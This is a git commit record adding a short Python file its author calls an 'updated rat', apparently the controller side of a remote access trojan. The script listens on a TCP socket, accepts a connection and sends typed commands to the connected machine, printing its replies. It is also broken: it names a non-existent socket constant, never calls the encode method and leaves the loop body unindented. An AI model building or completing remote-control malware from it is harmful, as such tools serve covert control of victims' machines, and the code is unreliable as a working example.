a0feebf442aef458b33d21cdbeade6c0966a1710
Jmoney2352 <164831861+Jmoney2352@users.noreply.github.com>
2024-04-07 11:29:56 -0700

    Create 1ratrupdated.py
    updated rat

---
+++ 1ratrupdated.py
@@ -0,0 +1,20 @@
+import socket
+import os
+
+os.system("cls && title Server")
+
+ip = "127.0.0.1"
+port = 50000
+
+s = socket.socket(socket.AF_INET,socket.SOCKET_STREAM)
+s.bind((ip, port))
+s.listen()
+
+c, addr = s.accept()
+
+print(addr, " - Has Connected")
+
+while True:
+command =input("Command@")
+c.send(command.encode)
+print(c.recv(1024).decode())
